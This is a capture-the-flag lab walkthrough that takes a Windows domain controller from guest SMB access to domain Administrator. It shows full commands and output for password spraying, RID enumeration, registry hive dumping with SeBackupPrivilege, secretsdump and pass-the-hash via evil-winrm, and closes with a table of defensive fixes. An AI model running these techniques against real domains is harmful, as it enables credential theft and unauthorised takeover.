---
title: "From Guest SMB Access to Domain Admin: Credential Hopping Through File Shares"
date: 2026-11-22
description: "Lateral movement in an AD domain by chaining leaked credentials, then abusing SeBackupPrivilege"
tags: ["active-directory", "smb", "ldap", "password-spraying", "sebackupprivilege", "pass-the-hash", "windows"]
toc: true
draft: true
---

In this writeup, we explore how leaked credentials can be used to move laterally
across a domain. We end up getting an account with `SeBackupPrivilege`,
which lets us dump the Administrator hash from the registry hives.

## Attack path at a glance

| # | Access gained | How |
|---|---|---|
| 1 | Guest | Null/guest session on SMB |
| 2 | Default new-hire password | `Notice from HR.txt` on the `HR` share |
| 3 | `michael.wrightson` | Spraying the default password over RID-bruteforced users |
| 4 | `david.orelious` | Password stored in the account's LDAP description |
| 5 | `emily.oscars` | Hard-coded credentials in `Backup_script.ps1` on the `DEV` share |
| 6 | `Administrator` | `SeBackupPrivilege` → SAM/SYSTEM hive dump → pass-the-hash |

## 1. Enumeration

### Port scan

The initial nmap scan shows a standard domain controller, with the domain
being `cicada.htb`.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -oN initial -sV 10.129.87.147
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-22 20:16 -0500
Nmap scan report for 10.129.87.147
Host is up (0.016s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-23 08:30:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.22 seconds
```

![Nmap service scan of the domain controller](images/smb-shares-to-domain-admin/01-nmap.png)

WinRM (5985) is common in CTFs. If we get a user that is in the _Remote Management Users_
group we can connect to that service with `evil-winrm` to get a shell.

### SMB as guest

Since the DC has the SMB port open, we can try to list the shares
using the default guest account with no password. Only the `HR` share
is readable.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nxc smb 10.129.87.147 -u guest -p '' --shares
SMB         10.129.87.147   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.87.147   445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.129.87.147   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.87.147   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.87.147   445    CICADA-DC        -----           -----------     ------
SMB         10.129.87.147   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.87.147   445    CICADA-DC        C$                              Default share
SMB         10.129.87.147   445    CICADA-DC        DEV
SMB         10.129.87.147   445    CICADA-DC        HR              READ
SMB         10.129.87.147   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.87.147   445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.129.87.147   445    CICADA-DC        SYSVOL                          Logon server share
```

![Guest session listing readable shares](images/smb-shares-to-domain-admin/02-guest-shares.png)

## 2. Leaked default password on the HR share

We find a credential in a message on the HR share. Some user probably forgot to
change the default password.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.87.147/HR -N -c 'ls'
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

                4168447 blocks of size 4096. 477222 blocks available

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.87.147/HR -N -c 'get "Notice from HR.txt"'
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (21.0 KiloBytes/sec) (average 21.0 KiloBytes/sec)

┌──(kali㉿kali)-[~/Desktop]
└─$ cat "Notice from HR.txt"

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: <DEFAULT_PASSWORD>

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

![Downloading and reading the HR welcome notice](images/smb-shares-to-domain-admin/03-hr-notice.png)

We dont have a username yet but we have a password that most likely belongs to someone.

## 3. Finding users and spraying the default password

### RID brute force

We can use impacket's lookupsid command to list accounts on the domain
with just guest access.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-lookupsid "CICADA.HTB/guest@10.129.87.147" -no-pass | grep SidTypeUser
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser)
```

![RID brute force with lookupsid](images/smb-shares-to-domain-admin/04-rid-brute.png)

### Password spray

We place the 5 human accounts into a users file so we can brute force a usernames
with a single password using `kerbrute`.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ cat users
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars

┌──(kali㉿kali)-[~/Desktop]
└─$ kerbrute passwordspray --dc 10.129.87.147 -d cicada.htb users '<DEFAULT_PASSWORD>' -v

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 11/22/26 - Ronnie Flathers @ropnop

2026/11/22 20:28:43 >  Using KDC(s):
2026/11/22 20:28:43 >   10.129.87.147:88

2026/11/22 20:28:43 >  [!] "" - Bad username: blank
2026/11/22 20:28:43 >  [!] michael.wrightson@cicada.htb:<DEFAULT_PASSWORD> - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (37) KRB_AP_ERR_SKEW Clock skew too great
2026/11/22 20:28:43 >  [!] john.smoulder@cicada.htb:<DEFAULT_PASSWORD> - Invalid password
2026/11/22 20:28:44 >  [!] sarah.dantelia@cicada.htb:<DEFAULT_PASSWORD> - Invalid password
2026/11/22 20:28:44 >  [!] david.orelious@cicada.htb:<DEFAULT_PASSWORD> - Invalid password
2026/11/22 20:28:44 >  [!] emily.oscars@cicada.htb:<DEFAULT_PASSWORD> - Invalid password
2026/11/22 20:28:44 >  Done! Tested 5 logins (0 successes) in 0.048 seconds
```

![Kerbrute password spray](images/smb-shares-to-domain-admin/05-password-spray.png)

{{< callout type="tip" title="Read the errors, not the summary" >}}
Kerbrute says that no logins were successful, but looking at the verbose error log
we see that Michael's account gets a different error message. That's because
the authentication for Michael succeeded but an extra security check on the
OS clock blocked the login, but this still indicates that the username + password
combo is valid.
{{< /callout >}}

## 4. Password in an LDAP description

Next we use Michael's creds to enumerate more shares to see if we gained read
access to one. We notice Michael does not have access to more non-default shares, but we can
list users' metadata on the LDAP database to find another leaked cred.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nxc ldap 10.129.87.147 -u michael.wrightson -p '<DEFAULT_PASSWORD>' --users
LDAP        10.129.87.147   389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never)
LDAP        10.129.87.147   389    CICADA-DC        [+] cicada.htb\michael.wrightson:<DEFAULT_PASSWORD>
LDAP        10.129.87.147   389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.129.87.147   389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.87.147   389    CICADA-DC        Administrator                 2024-08-26 16:08:03 0        Built-in account for administering the computer/domain
LDAP        10.129.87.147   389    CICADA-DC        Guest                         2024-08-28 13:26:56 0        Built-in account for guest access to the computer/domain
LDAP        10.129.87.147   389    CICADA-DC        krbtgt                        2024-03-14 07:14:10 0        Key Distribution Center Service Account
LDAP        10.129.87.147   389    CICADA-DC        john.smoulder                 2024-03-14 08:17:29 1
LDAP        10.129.87.147   389    CICADA-DC        sarah.dantelia                2024-03-14 08:17:29 1
LDAP        10.129.87.147   389    CICADA-DC        michael.wrightson             2024-03-14 08:17:29 0
LDAP        10.129.87.147   389    CICADA-DC        david.orelious                2024-03-14 08:17:29 1        Just in case I forget my password is <DAVID_PASSWORD>
LDAP        10.129.87.147   389    CICADA-DC        emily.oscars                  2024-08-22 17:20:17 1
```

![LDAP user enumeration revealing a password in a description](images/smb-shares-to-domain-admin/06-ldap-users.png)

While guest cannot read account descriptions, authenticated users can,
which means that we were able to leak David's password.

## 5. Hard-coded credentials on the DEV share

Enumerating the SMB shares again lets us see that David has read access on `DEV`
and `SYSVOL`.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nxc smb 10.129.87.147 -u david.orelious -p '<DAVID_PASSWORD>' --shares
SMB         10.129.87.147   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.87.147   445    CICADA-DC        [+] cicada.htb\david.orelious:<DAVID_PASSWORD>
SMB         10.129.87.147   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.87.147   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.87.147   445    CICADA-DC        -----           -----------     ------
SMB         10.129.87.147   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.87.147   445    CICADA-DC        C$                              Default share
SMB         10.129.87.147   445    CICADA-DC        DEV             READ
SMB         10.129.87.147   445    CICADA-DC        HR              READ
SMB         10.129.87.147   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.87.147   445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.129.87.147   445    CICADA-DC        SYSVOL          READ            Logon server share

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.87.147/SYSVOL -U 'david.orelious%<DAVID_PASSWORD>' -c 'ls'
  .                                   D        0  Thu Aug 22 13:40:07 2024
  ..                                  D        0  Thu Mar 14 07:08:56 2024
  cicada.htb                         Dr        0  Thu Mar 14 07:08:56 2024

                4168447 blocks of size 4096. 477201 blocks available

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.87.147/DEV -U 'david.orelious%<DAVID_PASSWORD>' -c 'ls'
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 477201 blocks available
```

![Shares readable by david.orelious](images/smb-shares-to-domain-admin/07-david-shares.png)

While David can read `SYSVOL` too, a quick search through the cicada.htb folder does not reveal
anything interesting beyond standard configuration files, so we move to the `DEV` share.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.87.147/SYSVOL -U 'david.orelious%<DAVID_PASSWORD>' -c 'ls; prompt off; recurse on; mget *'
  .                                   D        0  Thu Aug 22 13:40:07 2024
  ..                                  D        0  Thu Mar 14 07:08:56 2024
  cicada.htb                         Dr        0  Thu Mar 14 07:08:56 2024

                4168447 blocks of size 4096. 476862 blocks available
NT_STATUS_ACCESS_DENIED listing \cicada.htb\DfsrPrivate\*
getting file \cicada.htb\Policies\{2480865A-F9E0-4995-B568-987D80F2ADEF}\GPT.INI of size 59 as cicada.htb/Policies/{2480865A-F9E0-4995-B568-987D80F2ADEF}/GPT.INI (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
[... default policy files ...]
getting file \cicada.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 5342 as cicada.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (89.9 KiloBytes/sec) (average 18.9 KiloBytes/sec)

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.87.147/DEV -U 'david.orelious%<DAVID_PASSWORD>' -c 'ls; get Backup_script.ps1'
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 476862 blocks available
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (9.6 KiloBytes/sec) (average 9.6 KiloBytes/sec)
```

![Looting SYSVOL and downloading the backup script](images/smb-shares-to-domain-admin/08-dev-share-loot.png)

The backup script leaks another cred, this time for Emily's account.

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "<EMILY_PASSWORD>" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## 6. Foothold over WinRM

Since Emily is part of the _Remote Management Users_ group, we can use her account
to connect to port 5985 with `evil-winrm`.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ evil-winrm -i 10.129.87.147 -u 'emily.oscars' -p '<EMILY_PASSWORD>'

Evil-WinRM shell v4.1

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
<USER_FLAG>
```

![WinRM shell as emily.oscars and the user flag](images/smb-shares-to-domain-admin/09-winrm-emily.png)

## 7. Privilege escalation: SeBackupPrivilege

This account has the `SeBackupPrivilege`. Which according to Microsoft:
> allows file content retrieval, even if the security descriptor on the file might not grant such access

```console
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

![Privileges and group memberships of emily.oscars](images/smb-shares-to-domain-admin/10-privileges.png)

We can use the `SeBackupPrivilege` on Emily's account to dump registry hives.
Two interesting hives are the `SYSTEM` and `SAM` hives. `SYSTEM` holds the boot
key that can be used to decrypt `SAM`, which holds the account password
hashes.

We place the dumps in the `C:\shares\dev\` folder so that it is easy to pull
them from Kali.

```console
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> mkdir C:\temp

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/23/2026   1:05 AM                temp

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam C:\temp\SAM.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\SYSTEM C:\temp\SYSTEM.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> compress-archive -path C:\temp\SAM.hive, C:\temp\SYSTEM.hive -destinationpath C:\temp\hive.zip
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls C:\temp

    Directory: C:\temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/23/2026   1:06 AM        3143464 hive.zip
-a----        11/23/2026   1:05 AM          49152 SAM.hive
-a----        11/23/2026   1:05 AM       18558976 SYSTEM.hive

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> mv C:\temp\hive.zip C:\shares\dev
```

![Saving the SAM and SYSTEM hives and staging them on the DEV share](images/smb-shares-to-domain-admin/11-hive-dump.png)

{{< callout type="info" title="Why the zip and the share?" >}}
Zipping the hives makes it easier to download as evil-winrm's `download` command
can be flaky on large files.
{{< /callout >}}

## 8. Dumping the hashes offline

Now we can extract the password hashes from the hives with impacket's secretsdump.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.129.87.147/DEV -U 'david.orelious%<DAVID_PASSWORD>' -c 'ls; get hive.zip'
  .                                   D        0  Mon Nov 23 04:06:32 2026
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024
  hive.zip                            A  3143464  Mon Nov 23 04:06:06 2026

                4168447 blocks of size 4096. 471309 blocks available
getting file \hive.zip of size 3143464 as hive.zip (10164.9 KiloBytes/sec) (average 10164.9 KiloBytes/sec)

┌──(kali㉿kali)-[~/Desktop]
└─$ unzip hive.zip
Archive:  hive.zip
  inflating: SAM.hive
  inflating: SYSTEM.hive

┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-secretsdump -system SYSTEM.hive -sam SAM.hive LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:<REDACTED_LM_HASH>:<REDACTED_NT_HASH>:::
Guest:501:<REDACTED_LM_HASH>:<REDACTED_NT_HASH>:::
DefaultAccount:503:<REDACTED_LM_HASH>:<REDACTED_NT_HASH>:::
[*] Cleaning up...
```

![Retrieving the hives and running secretsdump](images/smb-shares-to-domain-admin/12-secretsdump.png)

On a domain controller, the local SAM `Administrator` often matches the domain
Administrator password; therefore, they share the same hash.

## 9. Pass-the-hash to Administrator

We don't need to crack the hash. Active Directory accepts the hash,
in what is called Pass-the-hash.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ evil-winrm -i 10.129.87.147 -u 'Administrator' --hash <ADMINISTRATOR_NT_HASH>

Evil-WinRM shell v4.1

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
<ROOT_FLAG>
```

![Pass-the-hash as Administrator and the root flag](images/smb-shares-to-domain-admin/13-pass-the-hash.png)

## Takeaways

| Weakness | Fix |
|---|---|
| Guest account enabled with read access to a share | Disable `Guest` and audit share ACLs for `Everyone` / anonymous access. |
| Default onboarding password in a readable file | Generate a unique one-time password per user and force a change at first logon. |
| Password in an LDAP `description` | Never store secrets in directory attributes, and audit them regularly (`Get-ADUser -Filter * -Properties description`). |
| Hard-coded credentials in a script | Use a gMSA or a secrets vault for scheduled jobs. |
| Low-privileged user in Backup Operators | Treat Backup Operators as Tier 0, and give it no WinRM access and no regular user accounts. |
| Local Administrator (DSRM) hash valid for the domain Administrator | Use different, random passwords for DSRM and domain Administrator (LAPS / regular rotation). |
